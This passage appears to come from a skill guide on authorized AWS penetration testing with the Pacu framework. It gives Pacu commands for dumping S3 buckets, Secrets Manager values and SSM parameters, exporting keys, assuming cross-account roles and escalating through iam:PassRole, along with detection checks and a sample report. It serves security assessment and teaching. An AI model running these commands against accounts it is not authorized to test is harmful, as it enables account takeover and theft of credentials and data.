# performing-cloud-penetration-testing-with-pacu — 详细参考（由 SKILL.md 拆分）

# Download S3 bucket data for analysis
Pacu > run s3__download_bucket --bucket target-bucket --dl-names

# Enumerate EC2 instances and extract user data
Pacu > run ec2__enum
Pacu > run ec2__download_userdata

# Enumerate Lambda functions and check for secrets in environment variables
Pacu > run lambda__enum

# Enumerate Secrets Manager
Pacu > run secretsmanager__enum

# Enumerate SSM parameters (often contain secrets)
Pacu > run ssm__download_parameters

# Check for exposed EBS snapshots
Pacu > run ebs__enum_snapshots_unauth
```

### Step 5: Test Lateral Movement and Persistence

Evaluate cross-account access, service exploitation, and persistence mechanisms.

```bash
# Test cross-account role assumption
Pacu > run sts__assume_role --role-arn arn:aws:iam::TARGET:role/CrossAccountRole

# Enumerate Lambda for code execution opportunities
Pacu > run lambda__enum
# If lambda:UpdateFunctionCode permission exists, could inject code

# Test EC2 instance connect for lateral movement
Pacu > run ec2__enum
# Check for instances with instance profiles that have broader permissions

# Check for CodeBuild projects (potential credential access)
Pacu > run codebuild__enum

# Enumerate ECS/Fargate for container-based lateral movement
Pacu > run ecs__enum

# Export all discovered data
Pacu > data all
```

### Step 6: Validate Detection and Generate Report

Review whether security controls detected the testing activities and compile findings.

```bash
# Check GuardDuty findings generated during testing
aws guardduty list-findings \
  --detector-id $(aws guardduty list-detectors --query 'DetectorIds[0]' --output text) \
  --finding-criteria '{
    "Criterion": {
      "updatedAt": {"GreaterThanOrEqual": ENGAGEMENT_START_EPOCH}
    }
  }' --output json

# Check Security Hub findings
aws securityhub get-findings \
  --filters '{
    "CreatedAt": [{"Start": "ENGAGEMENT_START_ISO", "End": "ENGAGEMENT_END_ISO"}]
  }'

# Export Pacu session data for reporting
Pacu > export_keys --all
Pacu > data all > pacu-session-export.json

# Clean up any test artifacts created during assessment
aws iam delete-user --user-name pacu-test-user 2>/dev/null
aws iam delete-access-key --user-name pacu-test-user --access-key-id AKIA... 2>/dev/null
```

## Key Concepts

| Term | Definition |
|------|------------|
| Pacu | Open-source AWS exploitation framework maintained by Rhino Security Labs, providing modular attack capabilities for authorized penetration testing |
| Privilege Escalation Scan | Automated analysis of IAM policies to identify known methods for elevating permissions from limited access to administrative control |
| iam:PassRole | Critical IAM action allowing a principal to assign roles to AWS services, enabling indirect privilege escalation through Lambda, EC2, or Glue |
| Cross-Account Role Assumption | Using sts:AssumeRole to obtain temporary credentials in another AWS account through trust policy configurations |
| Rules of Engagement | Documented agreement defining the scope, methods, timing, and boundaries of a penetration testing engagement |
| Post-Exploitation | Activities performed after initial access to demonstrate impact, including data access, lateral movement, and persistence establishment |

## Tools & Systems

- **Pacu**: AWS exploitation framework with 50+ modules for enumeration, escalation, persistence, and data exfiltration
- **CloudFox**: AWS enumeration tool for identifying attack paths from an attacker perspective
- **Principal Mapper**: IAM privilege escalation graph analysis tool for visualizing escalation paths
- **ScoutSuite**: Multi-cloud security assessment tool for identifying misconfigurations before testing
- **AWS CloudTrail**: Audit logging for capturing all Pacu activities during the engagement

## Common Scenarios

### Scenario: Red Team Assessment Starting from Compromised Developer Credentials

**Context**: A red team exercise simulates a scenario where an attacker obtains a developer's AWS access key from a leaked repository. The goal is to determine the maximum impact achievable from this starting point.

**Approach**:
1. Initialize Pacu with the compromised credentials and run `whoami` to confirm identity
2. Run `iam__enum_permissions` to map the developer's effective permissions
3. Execute `iam__privesc_scan` to identify escalation paths from developer to admin
4. Discover the developer can call `iam:PassRole` + `lambda:CreateFunction`, creating a Lambda with an admin role
5. Exploit the escalation to obtain admin-level temporary credentials
6. Enumerate S3 buckets, download sensitive data, and access Secrets Manager
7. Verify whether GuardDuty detected the escalation and data access activities
8. Clean up all test artifacts and document the complete attack chain

**Pitfalls**: Pacu modules can be noisy and generate many API calls in a short time. GuardDuty may trigger `Recon:IAMUser/MaliciousIPCaller` findings from the tester's IP. Coordinate with the SOC team to whitelist the testing IP or establish a clear communication channel to distinguish testing from real attacks. Always clean up persistence artifacts after testing.

## Output Format

```
AWS Penetration Test Report (Pacu)
=====================================
Target Account: 123456789012
Engagement Period: 2026-02-20 to 2026-02-23
Starting Credentials: Developer role (read-only S3, Lambda invoke)
Authorization: Signed ROE document #PT-2026-015

ATTACK PATH SUMMARY:
  Starting access: S3 read-only, Lambda invoke
  Maximum access achieved: AdministratorAccess (full account compromise)
  Time to admin: 47 minutes
  Detection by GuardDuty: Yes (after 12 minutes)
  Detection by Security Hub: Yes (after 18 minutes)
  SOC response time: 45 minutes (missed the escalation window)

PACU MODULES EXECUTED:
  iam__enum_users_roles_policies_groups: SUCCESS
  iam__enum_permissions: SUCCESS
  iam__privesc_scan: 3 escalation paths found
  s3__download_bucket: 4 buckets accessed
  lambda__enum: 12 functions enumerated
  secretsmanager__enum: 8 secrets retrieved

ESCALATION PATHS EXPLOITED:
  [1] iam:PassRole + lambda:CreateFunction -> AdminRole (CRITICAL)
  [2] sts:AssumeRole -> CrossAccountProdRole (HIGH)
  [3] iam:CreatePolicyVersion on dev-policy (CRITICAL)

DATA ACCESSED:
  S3 objects downloaded: 1,247 files (2.3 GB)
  Secrets Manager values: 8 secrets including DB credentials
  SSM parameters: 23 parameters including API keys

DETECTION RESULTS:
  GuardDuty findings generated: 7
  Security Hub findings: 12
  Custom CloudWatch alarms triggered: 3
  SOC acknowledged: Yes (45 min response)

RECOMMENDATIONS:
  1. Apply permission boundaries to all developer roles
  2. Remove iam:PassRole from non-admin principals
  3. Reduce SOC response time to < 15 minutes for IAM escalation alerts
  4. Implement SCP blocking iam:CreatePolicyVersion in non-admin OUs
```
